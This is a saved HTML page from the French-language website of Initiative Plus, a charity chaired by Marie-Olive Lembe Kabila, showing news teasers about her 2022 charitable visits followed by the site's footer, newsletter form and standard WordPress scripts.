+						<p>Des centaines d’élèves de la ville de Boma, province du Kongo central ont savouré la générosité légendaire de Marie-Olive Lembe Kabila. Ça se passe ce jeudi 22 septembre 2022 où l’épouse du Président honoraire, Joseph Kabila est arrivée avec quelques membres de son ONG pour un objectif humanitaire qui consiste à aider les enfants qui […]</p>
+					</div>
+				</div>
+			</div>
+		
+			<div class="col-md-4 col-sm-4  item" style="position: absolute; left: 390px; top: 0px;">
+				<div class="news-item">
+					<div class="meta">
+						
+						<div class="meta-item"><span class="icon icon-Agenda"></span><a href="https://www.initiativeplus-olk.org/marie-olive-lembe-kabila-fete-de-paque-avec-les-enfants-trisomiques/">15 avril 2022</a></div>
+						
+					</div>
+					<div class="image">
+						<a href="https://www.initiativeplus-olk.org/marie-olive-lembe-kabila-fete-de-paque-avec-les-enfants-trisomiques/">
+							<img src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/278176335_7954385844578855_2881819572714413388_n-555x400.jpeg" alt="Marie-Olive Lembe Kabila fête de Paque avec les enfants trisomiques">
+							<div class="image-content">
+								<span class="read-more">Lire la suite</span>
+							</div>
+						</a>
+					</div>
+					<div class="user-avatar clearfix">
+					
+			<a class="avatar" href="https://www.initiativeplus-olk.org/author/admin/">
+				<img class="" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/1e5e1d9f649ac6ed8c2a96bf2b1d0566" alt="admin">
+			</a>
+		
+					</div>
+					<div class="news-body">
+						<h5 class="post-title">Marie-Olive Lembe Kabila fête de Paque avec les enfants trisomiques</h5>
+						<p>Ce mercredi 13 avril 2022, la Présidente d‘Initiatives Plus, Marie-Olive Lembe Kabila, a communié avec un groupe d’enfants trisomiques au parc de la vallée de la N’sele&nbsp;à Kingakati. Ces derniers étaient accompagnés de leurs parents et leurs encadreurs du village Bondeko, une école spécialisée dans l’encadrement de cette catégorie d’enfants et qui travaille avec l’Association […]</p>
+					</div>
+				</div>
+			</div>
+		
+			<div class="col-md-4 col-sm-4  item" style="position: absolute; left: 780px; top: 0px;">
+				<div class="news-item">
+					<div class="meta">
+						
+						<div class="meta-item"><span class="icon icon-Agenda"></span><a href="https://www.initiativeplus-olk.org/pour-cloturer-le-mois-de-la-femme-marie-olive-lembe-kabila-honore-les-femmes-albinos/">31 mars 2022</a></div>
+						
+					</div>
+					<div class="image">
+						<a href="https://www.initiativeplus-olk.org/pour-cloturer-le-mois-de-la-femme-marie-olive-lembe-kabila-honore-les-femmes-albinos/">
+							<img src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/WhatsApp-Image-2022-03-30-at-13.25.20-3-555x400.jpeg" alt="Pour clôturer le mois de la femme , Marie-Olive Lembe Kabila honore les femmes albinos">
+							<div class="image-content">
+								<span class="read-more">Lire la suite</span>
+							</div>
+						</a>
+					</div>
+					<div class="user-avatar clearfix">
+					
+			<a class="avatar" href="https://www.initiativeplus-olk.org/author/admin/">
+				<img class="" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/1e5e1d9f649ac6ed8c2a96bf2b1d0566" alt="admin">
+			</a>
+		
+					</div>
+					<div class="news-body">
+						<h5 class="post-title">Pour clôturer le mois de la femme , Marie-Olive Lembe Kabila honore les femmes albinos</h5>
+						<p>Le mois de mars 2022, mois de la femme, a vécu et s’en est allé. Comme elle l’a commencé, avec une série de grande activités en faveur de l’autonomisation de la femme, Marie-Olive Lembe Kabila l’a également bien clôturé. Oui, clôturé de la plus belle manière avec une catégorie des personnes de fois négligées. En […]</p>
+					</div>
+				</div>
+			</div>
+		
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div data-vc-full-width="true" data-vc-full-width-init="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding with-bottom-effect vc_custom_1464289480408 kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px; padding-left: 90.5px; padding-right: 90.5px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><span class="vc_row-overlay" style="background-color: rgba(0,0,0,0.8) !important;"></span><div class="bottom-effect"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="twitter ">
+			<div class="slider-title"> <i class="fa fa-twitter"></i> <a href="http://twitter.com/Initiative%20Plus%20OLK">Initiative Plus OLK</a></div>
+You need to Setup Twitter API OAuth settings first</div></div></div></div></div><div class="vc_row-full-width"></div>
+
+	</div>
+</div>
+
+		<!-- ========================== -->
+		<!-- FOOTER -->
+		<!-- ========================== -->
+
+		<footer class="rtd">
+			<div class="container">
+			<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1464288444836{padding-top: 80px !important;padding-bottom: 60px !important;background-color: #ff6400 !important;}</style><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;">
+		<div class="wrap-anchor">
+			<a class="wrap-anchor-link" href="https://www.initiativeplus-olk.org/#footer-twitter"><div class="section-icon"><span class="icon icon-Umbrella"></span></div></a>
+		</div></div><div id="footer-twitter" data-vc-full-width="true" data-vc-full-width-init="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding text-white vc_custom_1464288444836 kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px; padding-left: 90.5px; padding-right: 90.5px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="twitter ">
+			<div class="slider-title">Latest from twitter <i class="fa fa-twitter"></i> <a href="http://twitter.com/templines">templines</a></div>
+Sorry , Twitter seems down or responds slowly.</div></div></div></div></div><div class="vc_row-full-width"></div>
+			<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1459002494237{padding-top: 50px !important;padding-bottom: 50px !important;background-image: url(https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/5X2A2089-scaled.jpg?id=427) !important;background-position: center !important;background-repeat: no-repeat !important;background-size: cover !important;}.vc_custom_1459005145801{padding-top: 80px !important;padding-bottom: 80px !important;background-color: #1a1a1a !important;}.vc_custom_1458999287326{padding-top: 15px !important;padding-bottom: 15px !important;background-color: #000000 !important;}.vc_custom_1459001400184{margin-top: 25px !important;}</style><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div data-vc-full-width="true" data-vc-full-width-init="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1459002494237 kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px; padding-left: 90.5px; padding-right: 90.5px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><span class="vc_row-overlay" style="background-color: rgba(0,0,0,0.8) !important;"></span><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+		<div class="social-section  wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+			<div class="tt">We are social 24/7 - Get in touch</div>
+			<ul class="list-socials">
+				
+
+		<li class=""><a href="https://twitter.com/" title="" target="_blank"><i class="fa fa-twitter"></i></a></li>
+
+	
+
+		<li class=""><a href="https://www.facebook.com/" title="" target="_blank"><i class="fa fa-facebook-f"></i></a></li>
+
+	
+			</ul>
+		</div>
+	</div></div></div></div><div class="vc_row-full-width"></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div data-vc-full-width="true" data-vc-full-width-init="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding text-white vc_custom_1459005145801 kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px; padding-left: 90.5px; padding-right: 90.5px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+		<div class="fobox ">
+			<h5 class="fobox-title">Qui sommes nous</h5><div class="focontent">Créée en 2008, Initiative Plus comme organisme caritative d’intérêt communautaire intervient principalement dans la santé, l’éducation, l’agriculteur et l’habitat. Alors qu’elle mettait en place cette Asbl, Marie-Olive Lembe Kabila était première dame de la République.<br>
+</div>
+		</div>
+		</div></div></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+		<div class="fobox ">
+			<h5 class="fobox-title">Sitemap</h5><div class="focontent"><p></p>
+<p>A propos<br>
+Nos réalisations<br>
+Derniers News<br>
+Nous Contactez</p>
+<p></p></div>
+		</div>
+		</div></div></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+		<div class="fobox ">
+			<h5 class="fobox-title">Contact info</h5><div class="focontent"><p></p>
+<p>01 Avenue Bandoma,&nbsp; Quartier Basoko, Commune de Ngaliema<br>
++243 814294661<br>
+contact@initiativeplus-olk.org</p>
+<p></p></div>
+		</div>
+		</div></div></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+		<div class="fobox ">
+			<h5 class="fobox-title">Newsletter</h5><div class="focontent">Abonnez-vous à notre newsletter pour les dernières mises à jour sur notre Asbl<p></p>
+<p></p></div>
+		</div>
+		<div class="vc_row wpb_row vc_inner vc_row-fluid vc_custom_1459001400184 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper"><div class=""><script>(function() {
+	window.mc4wp = window.mc4wp || {
+		listeners: [],
+		forms: {
+			on: function(evt, cb) {
+				window.mc4wp.listeners.push(
+					{
+						event   : evt,
+						callback: cb
+					}
+				);
+			}
+		}
+	}
+})();
+</script><!-- Mailchimp for WordPress v4.8.3 - https://wordpress.org/plugins/mailchimp-for-wp/ --><form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-424" method="post" data-id="424" data-name="form 1"><div class="mc4wp-form-fields">
+				<div class="oscend-mc4wp form-group has-feedback">
+	<input type="email" name="EMAIL" class="form-control " placeholder="Email address ..." required="">
+	<span class="icon icon-Mail form-control-feedback"></span>
+	<input type="submit" value="">
+</div>
+		</div><label style="display: none !important;">Laissez ce champ vide si vous êtes humain&nbsp;: <input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off"></label><input type="hidden" name="_mc4wp_timestamp" value="1689763857"><input type="hidden" name="_mc4wp_form_id" value="424"><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1"><div class="mc4wp-response"></div></form><!-- / Mailchimp for WordPress Plugin --></div></div></div></div></div></div></div></div></div><div class="vc_row-full-width"></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div data-vc-full-width="true" data-vc-full-width-init="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding text-white vc_custom_1458999287326 kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px; padding-left: 90.5px; padding-right: 90.5px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper"><h6 style="font-size: 10px;color: #999999;text-align: center" class="vc_custom_heading">©2021 IPOLK WEB . All Rights Reserved</h6></div></div></div></div><div class="vc_row-full-width"></div>
+			</div>
+		</footer>
+
+	<script>(function() {function maybePrefixUrlField() {
+	if (this.value.trim() !== '' && this.value.indexOf('http') !== 0) {
+		this.value = "http://" + this.value;
+	}
+}
+
+var urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]');
+if (urlFields) {
+	for (var j=0; j < urlFields.length; j++) {
+		urlFields[j].addEventListener('blur', maybePrefixUrlField);
+	}
+}
+})();</script><script type="text/javascript">
+			jQuery(document).ready(function(){		
+				var styleOutPut = "";
+			if (/MSIE 10/i.test(navigator.userAgent) || /MSIE 9/i.test(navigator.userAgent) || /rv:11.0/i.test(navigator.userAgent) ||  /Edge\/\d./i.test(navigator.userAgent) ){					
+					var msStyles = null;		
+					if(msStyles instanceof Array){
+						msStyles.forEach(function(shortcode) {
+							switch(shortcode["shortcode"]){
+								case "iconboxaction":
+									styleOutPut += shortcode["classname"]+":hover .km-iconboxb-iconc{color:"+shortcode["--icon-hover-color"]+"!important;}"+shortcode["classname"]+" .km-iconboxb-button:hover{background: "+shortcode["--button-hover-bg"]+"!important; color:"+shortcode["--button-hover-color"]+"!important; border-color:"+shortcode["--button-hover-border-color"]+"!important;}";
+									break;
+								case "filterimages":
+									styleOutPut += shortcode["classname"]+ ".km-filter-it-link:hover,"+shortcode["classname"]+" .km-filter-it-link[data-active=\"true\"],"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style5\"] .km-filter-it-link:hover,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style5\"] .km-filter-it-link[data-active=\"true\"]{color: "+shortcode["--color-hover"]+";}"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link:before,"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style4\"] .km-filter-it-link:before{background: "+shortcode["--scheme-color"]+";}"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style1\"] .km-filter-it-link:hover:after, "+shortcode["classname"]+" .km-filteri-cats[data-style=\"style1\"] .km-filter-it-link[data-active=\"true\"]:after,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link:hover:after, "+shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link[data-active=\"true\"]:after,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style2\"] .km-filter-it-link:hover:before,"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style2\"] .km-filter-it-link[data-active=\"true\"]:before,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link:hover:before,"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link[data-active=\"true\"]:before,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style4\"] .km-filter-it-link:hover:before,"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style4\"] .km-filter-it-link[data-active=\"true\"]:before,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style5\"] .km-filter-it-link:hover,"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style5\"] .km-filter-it-link[data-active=\"true\"],"+shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link:hover .km-filter-it-link-edge,"+ shortcode["classname"]+" .km-filteri-cats[data-style=\"style3\"] .km-filter-it-link[data-active=\"true\"] .km-filter-it-link-edge{ background:"+shortcode["--scheme-color-hover"]+";}";
+								break;	
+								case "kswrtheicon":
+									styleOutPut += shortcode["classname"]+"[data-hover=\"sasuki\"]  .kswr-icon-bg-h:before,"+shortcode["classname"]+"[data-hover=\"hiroshi\"]  .kswr-icon-bg-h:before,"+shortcode["classname"]+"[data-hover=\"haruki\"]  .kswr-icon-bg-h:before,"+shortcode["classname"]+"[data-hover=\"murawa\"]  .kswr-icon-bg-h:before,"+shortcode["classname"]+"[data-hover=\"sisawa\"]  .kswr-icon-bg-h:before{border-color:"+shortcode["--hover-bg"]+"!important;}";
+								break;
+								
+							}
+						});
+						jQuery("style[data-type='ms-style']").append(styleOutPut);							
+					}	
+
+				}
+			});	
+	</script><script type="text/html" id="wpb-modifications"></script><link href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/css(1)" rel="stylesheet" property="stylesheet" media="all" type="text/css">
+
+		<script type="text/javascript">
+		if(typeof revslider_showDoubleJqueryError === "undefined") {
+			function revslider_showDoubleJqueryError(sliderID) {
+				var err = "<div class='rs_error_message_box'>";
+				err += "<div class='rs_error_message_oops'>Oops...</div>";
+				err += "<div class='rs_error_message_content'>";
+				err += "You have some jquery.js library include that comes after the Slider Revolution files js inclusion.<br>";
+				err += "To fix this, you can:<br>&nbsp;&nbsp;&nbsp; 1. Set 'Module General Options' -> 'Advanced' -> 'jQuery & OutPut Filters' -> 'Put JS to Body' to on";
+				err += "<br>&nbsp;&nbsp;&nbsp; 2. Find the double jQuery.js inclusion and remove it";
+				err += "</div>";
+			err += "</div>";
+				var slider = document.getElementById(sliderID); slider.innerHTML = err; slider.style.display = "block";
+			}
+		}
+		</script>
+<link rel="stylesheet" id="vc_animate-css-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/animate.min(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="vc_font_awesome_5_shims-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/v4-shims.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="vc_font_awesome_5-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/all.min.css" type="text/css" media="all">
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/core.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/datepicker.min.js.télécharger"></script>
+<script type="text/javascript">
+jQuery(document).ready(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Fermer","currentText":"Aujourd\u2019hui","monthNames":["janvier","f\u00e9vrier","mars","avril","mai","juin","juillet","ao\u00fbt","septembre","octobre","novembre","d\u00e9cembre"],"monthNamesShort":["Jan","F\u00e9v","Mar","Avr","Mai","Juin","Juil","Ao\u00fbt","Sep","Oct","Nov","D\u00e9c"],"nextText":"Suivant","prevText":"Pr\u00e9c\u00e9dent","dayNames":["dimanche","lundi","mardi","mercredi","jeudi","vendredi","samedi"],"dayNamesShort":["dim","lun","mar","mer","jeu","ven","sam"],"dayNamesMin":["D","L","M","M","J","V","S"],"dateFormat":"d MM yy","firstDay":1,"isRTL":false});});
+</script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/spin.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/spin.jquery.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery.tooltipster.min.js.télécharger"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var booked_js_vars = {"ajax_url":"https:\/\/www.initiativeplus-olk.org\/wp-admin\/admin-ajax.php","profilePage":"","publicAppointments":"","i18n_confirm_appt_delete":"Are you sure you want to cancel this appointment?","i18n_please_wait":"Please wait ...","i18n_wrong_username_pass":"Wrong username\/password combination.","i18n_fill_out_required_fields":"Please fill out all required fields.","i18n_guest_appt_required_fields":"Please enter your name to book an appointment.","i18n_appt_required_fields":"Please enter your name, your email address and choose a password to book an appointment.","i18n_appt_required_fields_guest":"Please fill in all \"Information\" fields.","i18n_password_reset":"Please check your email for instructions on resetting your password.","i18n_password_reset_error":"That username or email is not recognized."};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/functions.js.télécharger"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var booked_fea_vars = {"ajax_url":"https:\/\/www.initiativeplus-olk.org\/wp-admin\/admin-ajax.php","i18n_confirm_appt_delete":"Are you sure you want to cancel this appointment?","i18n_confirm_appt_approve":"Are you sure you want to approve this appointment?"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/functions.js(1).télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery-ui.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/bootstrap.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery.waypoints.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/wow.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery.easypiechart.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/modernizr.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jflickrfeed.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/onscreen.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/isotope.pkgd.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/imagesloaded.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/DoubleTapToGo.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/owl.carousel.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/slick.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery.prettyPhoto.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/custom.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/comment-reply.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/wp-embed.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/js_composer_front.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/vc-waypoints.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/forms.min.js.télécharger"></script>
+	
+</body></html>
